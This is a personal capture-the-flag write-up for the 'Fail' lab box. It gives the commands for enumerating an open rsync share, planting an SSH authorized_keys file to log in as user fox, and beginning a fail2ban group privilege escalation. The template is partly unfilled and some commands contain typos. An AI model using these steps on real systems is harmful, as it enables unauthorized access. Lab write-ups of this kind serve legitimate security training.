---
Alias: Fail
Date: 5/3/2022
Platform: Linux
Difficulty: Intermediate
Tags:
Status: Finished
IP: 
---

# {{Fail}}


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- gobuster

---

# Information Gathering
Scanned all TCP ports:
```bash

```

Enumerated open TCP ports:
```bash
873
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 873

#### -Per googling port 873 enumeration I found "hacktricks" website showing to type "nmap -sV --script "rsync-list-modules" -p <PORT> <IP>" to enumerate shares:

![](Pasted%20image%2020221015215909.png)

#### -Found share "fox" typing "nmap -sV --script "rsync-list-modules" -p 873 192.168.143.126":

![](Pasted%20image%2020221015220513.png)
#Rsync 

#### -Per googling port 873 enumeration I found the below web page showing how to list files/directory from rsync server

![](Pasted%20image%2020221015220950.png)

![](Pasted%20image%2020221015221123.png)

#### -Typed "rsync -r 192.168.143.126::fox " and found the below files/directories showing user "fox" home directory and then downloaded all files/directories onto local machine by typing "rsync -av fox@192.168.143.126::fox/ ."

![](Pasted%20image%2020221015221356.png)

![](Pasted%20image%2020221015221635.png)

#### -Found nothing interesting reading the files
	
#### -Tested if I can upload files users "fox" home directory by typing "echo "hello world" > testfile.txt" and typing "rsync testfile.txt -r 192.168.143.126::fox" to see if it uploaded to fox's home directory. And I found I can:

![](Pasted%20image%2020221015221837.png)

#### -The directions how to find out how to do this was found on the previous website showing the following: 

![](Pasted%20image%2020221015222046.png)

#### -Googled "port 873 enumeration" and found the following page from hacktricks showing how to copy all files from your  local machine to the rsync server:

![](Pasted%20image%2020221015222900.png)


#### Then copied all rsync files to kali machine

---

# Exploitation
## Name of the technique

#### -Typed the following commands to create an authorized_keys file in fox's home directory so I can log in via SSH session:
-"mkdir fox" 
-"cd fox"
-"mkdir .ssh"
-"cd .ssh" 
-"touch id_rsa.pub" 
-"ssh-keygen -t rsa" 
-[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] "/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub"
-[Enter passphrase (empty for no passphrase):] "password"
-[Enter same passphrase again:] "password"
-"sudo mv id_rsa_pub authorized_keys"
-"cd .."
-"rsync -avp fox/ fox@192.168.120.149::fox/"

#### -Navigated to directory where the "id_rsa" file was created after running "ssh-keygen -t rsa" and typed "chmod 600" to create the correct permissions for the private ssh key

#### -Typed "ssh -I id_rsa fox@192.168.143.126" and typed in "password" for the password and received an ssh session as user fox

![](Pasted%20image%2020221016090756.png)

---

# Privilege Escalation
## Local Enumeration

#### -Ran "LunEnum.sh" script and found user "fox" is an owner of "fail2ban" group:

![](Pasted%20image%2020221016091122.png)

#### -Googled "fail2ban privilege escalation" and found the following webpage showing the steps to escalate privileges:

![](Pasted%20image%2020221016091817.png)

![](Pasted%20image%2020221016091921.png)

![](Pasted%20image%2020221016092000.png)

![](Pasted%20image%2020221016092047.png)

![](Pasted%20image%2020221016092139.png)

![](Pasted%20image%2020221016092235.png)
#Fail2BanPrivilegeEscalation 

---

## Privilege Escalation vector
## Fail2Ban group privelege escalation

#### -Per steps above I navigated to "/etc/fail2ban/action.d" folder and typed "ls –la" and found group "fail2ban" has write priviliges on file "iptables-multiport-log.conf":



---

